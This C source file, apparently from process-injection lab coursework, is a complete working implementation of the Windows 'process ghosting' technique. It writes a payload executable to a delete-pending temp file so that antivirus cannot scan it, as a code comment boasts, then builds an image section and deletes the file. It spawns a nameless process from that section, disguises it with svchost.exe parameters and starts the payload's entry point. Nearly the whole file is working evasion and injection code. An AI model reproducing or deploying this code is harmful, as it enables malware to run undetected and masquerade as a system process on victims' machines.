#include <windows.h>
#include "ghost.h"
#include <stdio.h>

// helper function - GetPayloadBuffer
BYTE* GetPayloadBuffer(OUT size_t& p_size) {
    HANDLE hFile = CreateFileW(L"C:\\Users\\vagrant\\Desktop\\CPIA-Work\\ProcessInjection\\ProcessDoppleganging\\Payload64\\payload64.exe", GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if (hFile == INVALID_HANDLE_VALUE) {
        perror("[-] Unable to open the payload file...\n");
        exit(-1);
    }
    p_size = GetFileSize(hFile, 0);
    BYTE* bufferAddress = (BYTE*)VirtualAlloc(0, p_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (bufferAddress == NULL) {
        perror("[-] Failed to allocate memory to the payload buffer...\n");
        exit(-1);
    }
    DWORD bytesRead = 0;
    if (!ReadFile(hFile, bufferAddress, p_size, &bytesRead, NULL)) {
        perror("[-] Failed to read the payload buffer.... \n");
        exit(-1);
    }
    return bufferAddress;
}

HANDLE MakeSectionFromDeletePendingFile(wchar_t* ntPath, BYTE* payloadBuffer, DWORD payloadSize) {
    HANDLE hFile;
    HANDLE hSection;
    NTSTATUS status;
    _OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING uFileName;
    IO_STATUS_BLOCK statusBlock = { 0 };
    DWORD bytesWritten;

    // resolving requisite APIs
    _NtOpenFile pNtOpenFile = (_NtOpenFile)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenFile");
    if (pNtOpenFile == NULL) {
        perror("[-] Failed to resolve NtOpenFile api...\n");
        exit(-1);
    }
    _RtlInitUnicodeString pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
    if (pRtlInitUnicodeString == NULL) {
        perror("[-] Failed to resolve RtlInitUnicodeString api...\n");
        exit(-1);
    }
    _NtSetInformationFile pNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationFile");
    if (pNtSetInformationFile == NULL) {
        perror("[-] Failed to resolve NtSetInfromationFile api...\n");
        exit(-1);
    }
    _NtCreateSection pNtCreateSection = (_NtCreateSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection");
    if (pNtCreateSection == NULL) {
        perror("[-] Failed to resolve NtCreateSection api...\n");
        exit(-1);
    }

    pRtlInitUnicodeString(&uFileName, ntPath);
    InitializeObjectAttributes(&objAttr, &uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
    wprintf(L"[+] Opening The File...\n");

    // FLAGS: 
    //		FILE_SUPERSEDED: deletes the old file and creates new one if file exists
    //		FILE_SYNCHRONOUS_IO_NONALERT: All operations on the file are performed synchronously
    status = pNtOpenFile(&hFile, GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE, &objAttr,
        &statusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_SUPERSEDED | FILE_SYNCHRONOUS_IO_NONALERT); // you can check the file created in the %temp% folder. right click protperties to expore some of it's properties.
    if (!NT_SUCCESS(status)) {
        perror("[-] Failed to open file...\n");
        exit(-1);
    }

    printf("[+] Change file state to delete-pending...\n");
    // set file disposition flag
    FILE_DISPOSITION_INFO info = { 0 };
    info.DeleteFile = TRUE;
    // Set delete-pending state to the file
    // FileDispositionInformation: Request to delete the file when it is closed
    status = pNtSetInformationFile(hFile, &statusBlock, &info, sizeof(info), FileDispositionInformation);
    if (!NT_SUCCESS(status)) {
        perror("[-] Failed to set the file in delete-pending state...\n");
        exit(-1);
    }
    // after executing the above api, if you now right clic -> properties on the temp file, under 'security' tab, you'd see that read perms are requires to view properties. Even dropping file to HxD gives acess deined. So even AV cant scan lol, file handle cant be opened.
    printf("[+] Writing payload to a delete-pending state file");
    // Write Payload To File
    // Since we've set our file to delete-pending state
    // as soon as we close the handle the file will disappear
    if (!WriteFile(hFile, payloadBuffer, payloadSize, &bytesWritten, NULL)) {
        perror("[-] Failed to write payload to the delete-pending file\n");
        exit(-1);
    }

    printf("[+] Creating section from the delete-pending file\n");
    // Before closing the handle we create a section from delete-pending file
    // This will later become the file-less section 
    // once we close the handle to the delete-pending file
    status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hFile); // now, under system informer -> handles, you can see section pointing to the delete-pending temp file. Right click to see the MZ header of the payload.
    if (!NT_SUCCESS(status)) {
        perror("[-] Failed to create a section from the delete-pending file...\n");
        exit(-1);
    }

    CloseHandle(hFile); // file is deleted now...
    hFile = NULL;
    printf("[+] File delete successfully\n");

    return hSection;
}

HANDLE CreateProcessWithSection(HANDLE hSection) {
    HANDLE hProcess = INVALID_HANDLE_VALUE;
    NTSTATUS status;
    _NtCreateProcessEx pNtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateProcessEx");
    if (pNtCreateProcessEx == NULL) {
        perror("[-] Failed to resolve NtCreateProcessEx api...\n");
        exit(-1);
    }
    status = pNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE); // under system informer, you should see the child process (name-less)
    if (!NT_SUCCESS(status)) {
        perror("[-] Failed to create process from the section...\n");
        exit(-1);
    }
    return hProcess;
}

// Getting entry point of the payload within the child process which was created from the image section.
ULONG_PTR GetEntryPoint(HANDLE hProcess, BYTE* payloadBuffer, PROCESS_BASIC_INFORMATION pbi) {
    // resolving requisite apis
    _RtlImageNTHeader pRtlImageNtHeader = (_RtlImageNTHeader)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlImageNtHeader");
    if (pRtlImageNtHeader == NULL) {
        perror("[-] Failed to resolve RtlImageNTHeader API...\n");
        exit(-1);
    }
    _NtReadVirtualMemory pNtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadVirtualMemory");
    if (pNtReadVirtualMemory == NULL) {
        perror("[-] Failed to resolve NtReadVirtualMemory API...\n");
        exit(-1);
    }

    BYTE image[0x1000];
    ULONG_PTR entryPoint;
    SIZE_T bytesRead;
    NTSTATUS status;
    ZeroMemory(image, sizeof(image));
    status = pNtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &image, sizeof(image), &bytesRead);
    if (!NT_SUCCESS(status)) {
        perror("[-] Failed to read the PEB base address\n");
        exit(-1);
    }
    printf("[+] PEB image base address : %p\n", (ULONG_PTR)((PPEB)image)->ImageBaseAddress);
    entryPoint = (pRtlImageNtHeader(payloadBuffer))->OptionalHeader.AddressOfEntryPoint;
    printf("[+] Address of the entry point: %p\n", entryPoint);
    entryPoint += (ULONG_PTR)((PPEB)image)->ImageBaseAddress;
    printf("[+] Entry point address adjusted with the image base address: %p\n", entryPoint);

    return entryPoint;
}


BOOL ProcessGhosting(BYTE* payloadBuffer, DWORD payloadSize) {
    NTSTATUS status;
    // resolving requisite apis for processing ghosting technique
    _NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    if (pNtQueryInformationProcess == NULL) {
        perror("[-] Failed to resolve NtQueryInformationProcess api...\n");
        exit(-1);
    }

    _RtlInitUnicodeString pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
    if (pRtlInitUnicodeString == NULL) {
        perror("[-] Failed to resolve RtlInitUnicodeString api...\n");
        exit(-1);
    }

    _NtCreateThreadEx pNtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
    if (pNtCreateThreadEx == NULL) {
        perror("[-] Failed to resolve NtCreateThreadEx api...\n");
        exit(-1);
    }

    _NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
    if (pNtWriteVirtualMemory == NULL) {
        perror("[-] Failed to resolve NtWriteVirtualMemory api...\n");
        exit(-1);
    }

    _NtAllocateVirtualMemory pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    if (pNtAllocateVirtualMemory == NULL) {
        perror("[-] Failed to resolve API NtAllocateVirtualMemory api...\n");
        exit(-1);
    }
    _RtlCreateProcessParametersEx pRtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlCreateProcessParametersEx");
    if (pRtlCreateProcessParametersEx == NULL) {
        perror("[-] Failed to resolve API RtlCreateProcessParametersEx api...\n");
        exit(-1);
    }

    // initializing requisite variables
    HANDLE hProcess = INVALID_HANDLE_VALUE;
    HANDLE hSection = INVALID_HANDLE_VALUE;
    DWORD returnLen;
    PROCESS_BASIC_INFORMATION pbi;
    ULONG_PTR entryPoint;
    UNICODE_STRING uTargetFile;
    PRTL_USER_PROCESS_PARAMETERS processParameters;
    PEB* remotePEB;
    HANDLE hThread;
    UNICODE_STRING uDllPath;

    wchar_t ntPath[MAX_PATH] = L"\\??\\";
    wchar_t tmpFileName[MAX_PATH] = { 0 };
    wchar_t tmpPath[MAX_PATH] = { 0 };
    GetTempPathW(MAX_PATH, tmpPath);
    GetTempFileNameW(tmpPath, L"PG", 0, tmpFileName);
    lstrcatW(ntPath, tmpFileName);

    hSection = MakeSectionFromDeletePendingFile(ntPath, payloadBuffer, payloadSize);
    if (hSection == INVALID_HANDLE_VALUE) {
        perror("[-] Invalid delete-pending section handle value...\n");
        exit(-1);
    }

    hProcess = CreateProcessWithSection(hSection);
    if (hProcess == INVALID_HANDLE_VALUE) {
        perror("[-] Invalid process handle value...\n");
        exit(-1);
    }

    printf("[+] Successfully created a process from file-less section\n");
    // Getting Process Infromation
    status = pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLen);
    if (!NT_SUCCESS(status)) {
        perror("[-] Error Getting Process Infromation!!\n");
        exit(-1);
    }

    // From here on, it's same as Process Herpaderping
    // Getting EntryPoint 
    entryPoint = GetEntryPoint(hProcess, payloadBuffer, pbi);

    WCHAR targetPath[MAX_PATH];
    lstrcpyW(targetPath, L"C:\\windows\\system32\\svchost.exe");
    pRtlInitUnicodeString(&uTargetFile, targetPath);
    // Create and Fix parameters for newly created process
    // Create Process Parameters
    wchar_t dllDir[] = L"C:\\Windows\\System32";
    UNICODE_STRING uDllDir = { 0 };
    pRtlInitUnicodeString(&uDllPath, dllDir);
    status = pRtlCreateProcessParametersEx(&processParameters, &uTargetFile, &uDllPath, NULL,
        &uTargetFile, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
    if (!NT_SUCCESS(status)) {
        perror("[-] Unable to Create Process Parameters...\n");
        exit(-1);
    }

    // ALlocating memory for parameters in target process
    PVOID paramBuffer = processParameters;
    SIZE_T paramSize = processParameters->EnvironmentSize + processParameters->MaximumLength;
    status = pNtAllocateVirtualMemory(hProcess, &paramBuffer, 0, &paramSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        perror("[-] Unable To Allocate Memory For Process Parameters...\n");
        exit(-1);
    }
    printf("[+] Allocated Memory for Process Parameters %p\n", paramBuffer);
    // Writing Process Parameters in Target Process
    status = pNtWriteVirtualMemory(hProcess, processParameters, processParameters,
        processParameters->EnvironmentSize + processParameters->MaximumLength, NULL);
    remotePEB = (PEB*)pbi.PebBaseAddress;
    // Updating Process Parameters Address at remote PEB
    if (!WriteProcessMemory(hProcess, &remotePEB->ProcessParameters, &processParameters, sizeof(PVOID), NULL)) {
        perror("[-] Error Updating Process Parameters...\n");
        exit(-1);
    }
    printf("[+] Updated Remote Process Parameters Address at PEB\n");

    // Create Thread
    status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
        (LPTHREAD_START_ROUTINE)entryPoint, NULL, FALSE, 0, 0, 0, NULL);
    if (!NT_SUCCESS(status)) {
        perror("[-] failed to spawn thread in the process...\n");
        exit(-1);
    }
    printf("[+] Thread Executed...\n");

    return TRUE;
}

int main() {
    size_t payloadSize = 0;
    BYTE* payloadBuffer = GetPayloadBuffer(payloadSize);
    BOOL isSuccess = ProcessGhosting(payloadBuffer, (DWORD)payloadSize);
    system("pause");
}